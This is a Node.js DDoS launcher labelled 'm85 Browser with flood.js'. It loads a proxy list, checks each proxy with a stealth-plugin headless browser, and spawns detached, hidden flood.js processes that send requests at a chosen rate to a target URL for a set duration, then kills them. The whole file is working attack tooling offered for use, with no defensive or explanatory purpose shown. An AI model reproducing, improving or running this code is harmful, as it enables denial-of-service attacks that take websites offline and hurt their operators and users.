const fs = require("fs");
const { spawn } = require("child_process");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin
puppeteer.use(StealthPlugin());

// Configuration
const TIMEOUT = 15000; // Reduced to 15 seconds
const MAX_CONCURRENT_BROWSERS = 3; // Limit concurrent browser instances

// Colors for logging
const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  pink: "\x1b[35m",
};

function log(type, message) {
  const prefix = `${colors.cyan}[m85|Browser]${colors.reset}`;
  let color = colors.reset;
  let symbol = "ℒ";
  
  if (type === "error") { color = colors.red; symbol = "×"; }
  if (type === "success") { color = colors.green; symbol = "✓"; }
  if (type === "warn") { color = colors.yellow; symbol = "!"; }
  if (type === "info") { color = colors.cyan; symbol = "ℒ"; }
  if (type === "pink") { color = colors.pink; symbol = "★"; }
  
  console.log(`${prefix} ${color}${symbol} ${message}${colors.reset}`);
}

// Check command line arguments
if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <url> <threads> <proxies.txt> <rate> <duration_seconds>");
  log("error", "Example: node browser.js https://example.com 5 proxies.txt 100 60");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
let proxies = [];
try {
  const data = fs.readFileSync(proxyFile, 'utf8');
  proxies = data.trim().split(/\r?\n/).filter(p => p.trim());
  log("success", `Loaded ${proxies.length} proxies`);
} catch (error) {
  log("error", `Cannot read proxy file: ${error.message}`);
  process.exit(1);
}

if (proxies.length === 0) {
  log("error", "No proxies found in file");
  process.exit(1);
}

// Random user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

function getRandomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Browser pool to reuse instances
class BrowserPool {
  constructor(maxSize) {
    this.maxSize = maxSize;
    this.pool = [];
    this.active = new Set();
  }

  async acquire() {
    // Wait if pool is empty and we're at max capacity
    while (this.active.size >= this.maxSize) {
      await sleep(100);
    }

    let browser = this.pool.pop();
    if (browser) {
      this.active.add(browser);
      return browser;
    }

    return null;
  }

  release(browser) {
    this.active.delete(browser);
    if (this.pool.length < this.maxSize) {
      this.pool.push(browser);
    } else {
      browser.close().catch(() => {});
    }
  }

  async closeAll() {
    const allBrowsers = [...this.pool, ...this.active];
    this.pool = [];
    this.active.clear();
    await Promise.all(allBrowsers.map(b => b.close().catch(() => {})));
  }
}

// Simplified browser opening - NO page navigation to prevent tabs
async function quickBrowserCheck(proxy, id) {
  let browser = null;
  
  // Simple proxy formatting
  let proxyUrl = proxy.trim();
  proxyUrl = proxyUrl.replace(/^https?:\/\//, '');
  proxyUrl = `http://${proxyUrl}`;
  
  log("info", `[${id}] Quick check proxy: ${proxy}`);
  
  try {
    // Launch browser with minimal options
    const options = {
      headless: "new",
      ignoreHTTPSErrors: true,
      args: [
        `--proxy-server=${proxyUrl}`,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--disable-accelerated-2d-canvas',
        '--disable-component-extensions-with-background-pages',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-default-browser-check',
        '--no-first-run',
      ]
    };
    
    // Quick launch attempt - no navigation
    browser = await puppeteer.launch(options);
    
    // Immediately close the browser without creating any pages
    await browser.close();
    
    log("success", `[${id}] Proxy works: ${proxy}`);
    return true;
    
  } catch (error) {
    log("warn", `[${id}] Proxy failed: ${error.message}`);
    if (browser) await browser.close().catch(() => {});
    return false;
  }
}

// Spawn flood.js directly without browser navigation
async function spawnFlood(proxy, id) {
  log("success", `[${id}] 🚀 Spawning flood.js with proxy: ${proxy}`);
  
  const floodArgs = [
    "flood.js",
    targetURL,
    "100",
    "2",
    proxy,
    rates,
    "no-cookies",
    getRandomUA()
  ];
  
  // Spawn flood.js process
  const floodProcess = spawn("node", floodArgs, {
    detached: true,
    stdio: 'ignore',
    windowsHide: true
  });
  
  floodProcess.unref();
  
  log("success", `[${id}] flood.js PID: ${floodProcess.pid}`);
  
  return {
    id: id,
    proxy: proxy,
    pid: floodProcess.pid
  };
}

// Cleanup function
function cleanup() {
  log("warn", "Cleaning up flood.js processes...");
  
  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', () => {});
  } else {
    const { exec } = require('child_process');
    exec('pkill -f flood.js', () => {});
  }
}

// Main function
async function main() {
  log("info", `╔════════════════════════════════════════╗`);
  log("info", `║     m85 Browser with flood.js         ║`);
  log("info", `║     OPTIMIZED - NO TAB SPAM           ║`);
  log("info", `╚════════════════════════════════════════╝`);
  log("info", `Target: ${targetURL}`);
  log("info", `Threads: ${threads}`);
  log("info", `Rate: ${rates} req/sec`);
  log("info", `Duration: ${duration} seconds`);
  log("info", `Total proxies: ${proxies.length}`);
  log("info", `Max concurrent checks: ${MAX_CONCURRENT_BROWSERS}`);
  
  // Check if flood.js exists
  if (!fs.existsSync("flood.js")) {
    log("error", "flood.js not found in current directory!");
    log("error", "Make sure flood.js exists before running this script");
    process.exit(1);
  }
  
  // Shuffle proxies for better distribution
  for (let i = proxies.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
  }
  
  // Set up cleanup on exit
  process.on('SIGINT', () => {
    log("warn", "\n⚠ Interrupt received, cleaning up...");
    cleanup();
    setTimeout(() => {
      log("success", "Goodbye!");
      process.exit(0);
    }, 2000);
  });
  
  // Create queue of proxies
  const proxyQueue = [...proxies];
  let spawned = 0;
  let skipped = 0;
  let activeQuickChecks = 0;
  const maxQuickChecks = Math.min(threads, MAX_CONCURRENT_BROWSERS);
  
  // Quick check and spawn function - NO PAGE NAVIGATION
  async function processProxy(proxy, id) {
    activeQuickChecks++;
    
    // Quick browser check (no page navigation)
    const isWorking = await quickBrowserCheck(proxy, id);
    
    if (isWorking) {
      // Spawn flood.js immediately
      await spawnFlood(proxy, id);
      spawned++;
      log("success", `[${id}] ✅ Spawned flood.js (${spawned}/${proxies.length})`);
    } else {
      skipped++;
      log("warn", `[${id}] ❌ Proxy skipped (${skipped} failures so far)`);
    }
    
    activeQuickChecks--;
    
    // Process next proxy if available
    if (proxyQueue.length > 0) {
      const nextProxy = proxyQueue.shift();
      if (nextProxy && activeQuickChecks < maxQuickChecks) {
        processProxy(nextProxy, id + threads);
      } else if (nextProxy) {
        // Wait for slot to open
        while (activeQuickChecks >= maxQuickChecks) {
          await sleep(100);
        }
        processProxy(nextProxy, id + threads);
      }
    }
  }
  
  // Start initial checks
  const startTime = Date.now();
  const initialBatches = Math.min(maxQuickChecks, proxyQueue.length);
  
  for (let i = 0; i < initialBatches; i++) {
    const proxy = proxyQueue.shift();
    if (proxy) {
      processProxy(proxy, i + 1);
    }
  }
  
  // Wait for duration
  log("info", `⏱ Running checks and floods for ${duration} seconds...`);
  
  // Progress indicator
  const interval = setInterval(() => {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const remaining = duration - elapsed;
    if (remaining > 0 && remaining % 10 === 0) {
      log("info", `⏱ Time remaining: ${remaining}s | Spawned: ${spawned} | Failed: ${skipped}`);
    }
  }, 10000);
  
  // Wait for duration
  while (Date.now() < startTime + (duration * 1000)) {
    await sleep(1000);
  }
  
  clearInterval(interval);
  
  // Wait for any pending checks to complete
  while (activeQuickChecks > 0 || proxyQueue.length > 0) {
    await sleep(100);
  }
  
  // Stop and cleanup
  log("warn", "\n⏱ Time limit reached, stopping flood.js processes...");
  cleanup();
  
  // Wait for cleanup
  await sleep(3000);
  
  // Final statistics
  log("info", "\n╔════════════════════════════════════════╗");
  log("info", "║           FINAL RESULTS                ║");
  log("info", "╚════════════════════════════════════════╝");
  log("success", `✅ flood.js processes spawned: ${spawned}`);
  log("warn", `❌ Failed proxies: ${skipped}`);
  log("success", `📈 Spawn rate: ${((spawned / duration) * 60).toFixed(1)} per minute`);
  log("success", `🎯 Target: ${targetURL}`);
  log("success", `⚡ Rate: ${rates} requests/second per flood.js`);
  
  process.exit(0);
}

// Run main function
main().catch(error => {
  log("error", `Fatal error: ${error.message}`);
  process.exit(1);
});
